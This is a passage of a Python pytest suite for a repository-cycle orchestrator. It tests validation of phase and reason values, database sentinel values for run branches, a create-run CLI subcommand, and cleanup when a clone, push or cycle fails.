            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=bad_executor,
        )
    msg = str(exc_info.value)
    assert "cycle 1" in msg
    # The rejected value must appear in the message so the operator can
    # grep their executor for it.
    assert "'unknown'" in msg
    _assert_all_phases_in_message(msg)


def test_orchestrate_run_raises_when_phase_reached_is_bogus(db, project, tmp_path, monkeypatch):
    """Any arbitrary out-of-set value (typo, freshly invented enum) must
    fail at the orchestrator, not slip through to the DB CHECK."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def bad_executor(clone_dir, proj, run_row, cycle_n):
        return {
            "status": "abandoned",
            "phase_reached": "not_a_phase",
            "reason": "other",
            "detail": "executor invented a phase value",
            "participants": [],
            "artifacts": [],
        }

    with pytest.raises(ValueError, match="phase_reached") as exc_info:
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=bad_executor,
        )
    msg = str(exc_info.value)
    assert "cycle 1" in msg
    assert "'not_a_phase'" in msg
    _assert_all_phases_in_message(msg)


def test_orchestrate_run_raises_when_reason_is_invalid(db, project, tmp_path, monkeypatch):
    """Symmetric guard for `reason` — the orchestrator no longer defaults
    to 'other'; any out-of-set value must fail loud with a ValueError that
    enumerates the legal reasons."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    def bad_executor(clone_dir, proj, run_row, cycle_n):
        return {
            "status": "abandoned",
            "phase_reached": "meeting",
            "reason": "made_up_reason",
            "detail": "executor invented a reason value",
            "participants": [],
            "artifacts": [],
        }

    with pytest.raises(ValueError, match="reason") as exc_info:
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=bad_executor,
        )
    msg = str(exc_info.value)
    assert "cycle 1" in msg
    assert "'made_up_reason'" in msg
    _assert_all_reasons_in_message(msg)


@pytest.mark.parametrize(
    "phase",
    ["agenda", "meeting", "implementation", "test", "review", "push"],
)
def test_orchestrate_run_accepts_all_schema_allowed_phase_values(
    db, project, tmp_path, monkeypatch, phase
):
    """CHECK-positive regression guard: every phase value the orchestrator
    CAN emit (per the schema CHECK in migration 004) must round-trip through
    record_abandonment and land in the abandonments table.

    This is the gap that allowed the "unknown" sentinel bug to hide for so
    long — there was no test asserting that the values the orchestrator
    actually emits are schema-accepted. Each parametrized run uses a
    pairing of phase + reason that is schema-valid.
    """
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    # Pair each phase with a reason the CHECK constraint accepts.
    # The combos are not all semantically real but ALL are schema-valid,
    # which is the only contract this test pins.
    reason_for_phase = {
        "agenda": "no_consensus",
        "meeting": "no_consensus",
        "implementation": "destructive_rejected",
        "test": "tests_unrecoverable",
        "review": "review_unrecoverable",
        "push": "other",
    }

    def stub_executor(clone_dir, proj, run_row, cycle_n):
        return {
            "status": "abandoned",
            "phase_reached": phase,
            "reason": reason_for_phase[phase],
            "detail": f"stub abandonment with phase={phase}",
            "participants": [],
            "artifacts": [],
        }

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=1,
        cycle_executor=stub_executor,
    )

    assert result["status"] == "complete"
    assert result["cycles_abandoned"] == 1
    assert len(result["abandonments"]) == 1
    ab = result["abandonments"][0]
    assert ab["phase_reached"] == phase
    assert ab["reason"] == reason_for_phase[phase]

    # Confirm the row landed in the DB (not just the in-memory dict).
    from scripts.db import get_connection

    conn = get_connection(db)
    try:
        cur = conn.execute(
            "SELECT phase_reached, reason FROM abandonments WHERE cycle_id = ?",
            (ab["cycle_id"],),
        )
        db_row = cur.fetchone()
    finally:
        conn.close()
    assert db_row is not None
    assert db_row[0] == phase
    assert db_row[1] == reason_for_phase[phase]


# ── update_run_branch helper ──────────────────────────────────────────────


def test_update_run_branch_writes_real_branch_name(db, project):
    row = create_run(db, project["id"], "<pending>", 1, "x")
    update_run_branch(db, row["id"], "kaizen/foo-2026-05-23-2342")
    refreshed = get_run(db, row["id"])
    assert refreshed["branch"] == "kaizen/foo-2026-05-23-2342"


def test_update_run_branch_writes_failed_sentinel_for_none(db, project):
    """The MAJOR-NEW-BRANCH-NOT-NULL fix: passing branch=None must
    persist the '<failed>' sentinel, NOT a literal SQL NULL (the schema
    column is `TEXT NOT NULL` per migrations/001 line 18)."""
    row = create_run(db, project["id"], "<pending>", 1, "x")
    update_run_branch(db, row["id"], None)
    refreshed = get_run(db, row["id"])
    assert refreshed["branch"] == "<failed>"
    # Confirm at the DB level too — never NULL.
    from scripts.db import get_connection

    conn = get_connection(db)
    try:
        cur = conn.execute("SELECT branch FROM runs WHERE id=?", (row["id"],))
        raw = cur.fetchone()[0]
    finally:
        conn.close()
    assert raw == "<failed>"
    assert raw is not None


def test_update_run_branch_raises_on_unknown_run_id(db):
    with pytest.raises(ValueError, match="not found"):
        update_run_branch(db, 999_999, "kaizen/x")


# ── create-run-only CLI subcommand ────────────────────────────────────────


def test_create_run_only_fails_loudly_when_project_not_registered(db, capsys):
    """Decision D3: no project for URL → exit 1 with a registration
    hint. Auto-registration was rejected because it would mask URL
    typos."""
    code = _cmd_create_run_only(["https://github.com/nope/never.git", "1"], db_path=db)
    assert code == 1
    err = capsys.readouterr().err
    assert "No project registered" in err
    assert "project.py register" in err


def test_create_run_only_prints_only_run_id(db, project, capsys):
    code = _cmd_create_run_only([project["git_url"], "2", "my subject"], db_path=db)
    assert code == 0
    captured = capsys.readouterr()
    # stdout MUST contain ONLY the run id (and a trailing newline).
    stdout = captured.out.strip()
    assert stdout.isdigit(), f"expected only the run_id on stdout; got {stdout!r}"
    run_id = int(stdout)
    row = get_run(db, run_id)
    assert row["status"] == "running"
    assert row["branch"] == "<pending>"
    assert row["cycles_requested"] == 2
    assert row["subject"] == "my subject"


def test_create_run_only_seeds_pending_branch_placeholder(db, project):
    code = _cmd_create_run_only([project["git_url"], "1"], db_path=db)
    assert code == 0
    rows = list_runs(db, project_id=project["id"])
    assert rows[-1]["branch"] == "<pending>"


# ── orchestrate_run with run_id kwarg ─────────────────────────────────────


def test_orchestrate_run_with_run_id_skips_create_run(db, project, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)
    # Seed a pending row via create-run-only.
    rid_from_cli = _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
    assert rid_from_cli == 0
    # The run row exists; grab it.
    rows = list_runs(db, project_id=project["id"])
    assert len(rows) == 1
    pending_run = rows[0]
    assert pending_run["branch"] == "<pending>"

    def fake_executor(clone_dir, proj, run_row, cycle_n):
        return {
            "status": "success",
            "commit_sha": "shaX",
            "minutes_memex_slug": None,
        }

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=1,
        subject="subj",
        cycle_executor=fake_executor,
        run_id=pending_run["id"],
    )
    # Same run_id round-tripped — no second row created.
    assert result["run_id"] == pending_run["id"]
    assert len(list_runs(db, project_id=project["id"])) == 1
    # Branch was updated from <pending> to the real name.
    final = get_run(db, pending_run["id"])
    assert final["branch"] != "<pending>"
    assert final["branch"].startswith("kaizen/")


def test_orchestrate_run_with_unknown_run_id_raises(db, project, tmp_path, monkeypatch):
    _install_orchestrator_stubs(monkeypatch, tmp_path)
    with pytest.raises(ValueError, match="run_id="):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=lambda *a: {
                "status": "success",
                "commit_sha": "x",
                "minutes_memex_slug": None,
            },
            run_id=999_999,
        )


def test_orchestrate_run_unknown_run_id_raises_before_clone(db, project, tmp_path, monkeypatch):
    """M1 (review round 1): unknown `run_id` must raise BEFORE any
    clone/seed/branch side effect. Previously the check fired AFTER
    clone_repo + seed_all + create_branch, leaving disk debris."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    clone_calls: list = []
    seed_calls: list = []
    branch_calls: list = []

    import scripts.clone as clone_mod
    import scripts.cycle_git as cg_mod
    import scripts.seed_atelier_in_clone as seed_mod

    monkeypatch.setattr(clone_mod, "clone_repo", lambda *a, **k: clone_calls.append(a))
    monkeypatch.setattr(seed_mod, "seed_all", lambda *a, **k: seed_calls.append(a))
    monkeypatch.setattr(cg_mod, "create_branch", lambda *a, **k: branch_calls.append(a))

    experiment_dir = tmp_path / "experiment" / "owner-repo"

    with pytest.raises(ValueError, match="run_id="):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=lambda *a: {
                "status": "success",
                "commit_sha": "x",
                "minutes_memex_slug": None,
            },
            run_id=999_999,
        )

    assert clone_calls == [], f"clone_repo must not run; got {clone_calls}"
    assert seed_calls == [], f"seed_all must not run; got {seed_calls}"
    assert branch_calls == [], f"create_branch must not run; got {branch_calls}"
    assert not experiment_dir.exists()


def test_orchestrate_run_clone_failure_blanks_branch_when_run_id_supplied(
    db, project, tmp_path, monkeypatch
):
    """M2 (review round 1): clone_repo failure with run_id supplied must
    transition runs.branch from '<pending>' to '<failed>' AND
    finalize_run as 'failed'. Previously the run row stuck at
    branch='<pending>' / status='running' forever."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)
    import scripts.clone as clone_mod

    def boom_clone(*a, **k):
        raise RuntimeError("clone boom")

    monkeypatch.setattr(clone_mod, "clone_repo", boom_clone)

    rc = _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
    assert rc == 0
    pending_run = list_runs(db, project_id=project["id"])[-1]
    assert pending_run["branch"] == "<pending>"

    with pytest.raises(RuntimeError, match="clone boom"):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=lambda *a: {
                "status": "success",
                "commit_sha": "x",
                "minutes_memex_slug": None,
            },
            run_id=pending_run["id"],
        )

    final = get_run(db, pending_run["id"])
    assert final["branch"] == "<failed>", (
        f"clone failure must blank branch; got {final['branch']!r}"
    )
    assert final["status"] == "failed"


def test_orchestrate_run_push_failure_blanks_branch_when_run_id_supplied(
    db, project, tmp_path, monkeypatch
):
    """M3 (review round 1): push_branch failure must also blank the
    branch column when run_id was supplied, so a later manual pr.py
    invocation refuses to render."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)

    import scripts.cycle_git as cg_mod

    def boom_push(*a, **k):
        raise RuntimeError("push refused")

    monkeypatch.setattr(cg_mod, "push_branch", boom_push)

    rc = _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
    assert rc == 0
    pending_run = list_runs(db, project_id=project["id"])[-1]

    result = orchestrate_run(
        db_path=db,
        git_url=project["git_url"],
        cycles_requested=1,
        cycle_executor=lambda *a: {
            "status": "success",
            "commit_sha": "x",
            "minutes_memex_slug": None,
        },
        run_id=pending_run["id"],
    )
    assert result["status"] == "failed"
    final = get_run(db, pending_run["id"])
    assert final["branch"] == "<failed>"
    assert final["status"] == "failed"


def test_orchestrate_run_with_run_id_writes_failed_sentinel_on_cycle_exception(
    db, project, tmp_path, monkeypatch
):
    """The bridge entry path's failure case: when the cycle loop raises,
    runs.branch must transition from '<pending>' (or the real name) to
    '<failed>' so render_pr_body refuses any later PR attempt."""
    _install_orchestrator_stubs(monkeypatch, tmp_path)
    _cmd_create_run_only([project["git_url"], "1", "subj"], db_path=db)
    pending_run = list_runs(db, project_id=project["id"])[-1]

    def boom(clone_dir, proj, run_row, cycle_n):
        raise RuntimeError("cycle boom")

    with pytest.raises(RuntimeError, match="cycle boom"):
        orchestrate_run(
            db_path=db,
            git_url=project["git_url"],
            cycles_requested=1,
            cycle_executor=boom,
            run_id=pending_run["id"],
        )

    final = get_run(db, pending_run["id"])
    assert final["status"] == "failed"
    assert final["branch"] == "<failed>"
